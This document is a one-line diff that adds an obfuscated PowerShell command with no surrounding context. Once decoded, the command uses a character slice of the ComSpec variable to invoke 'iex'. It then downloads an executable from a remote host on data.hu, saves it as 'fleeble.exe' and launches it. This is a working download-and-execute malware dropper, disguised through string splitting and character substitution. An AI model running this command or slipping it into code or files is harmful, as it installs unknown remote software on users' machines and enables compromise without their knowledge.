@@ -1,0 +1,1 @@
+﻿ & ( $ENv:CoMSpec[4,26,25]-JOIN'')((('(New-Object System.Net.Web'+'Client).D'+'ownl'+'oadFil'+'e(UrGhttp://'+'dd'+'l3'+'.data'+'.h'+'u/get'+'/0/9535517/yha'+'ooo'+'.ex'+'eUr'+'G'+',U'+'rG'+'flee'+'ble.exeUr'+'G'+');Start'+'-Pr'+'ocess UrGfl'+'eeble.ex'+'eUrG') -crEpLace  ([cHar]85+[cHar]114+[cHar]71),[cHar]39)) 
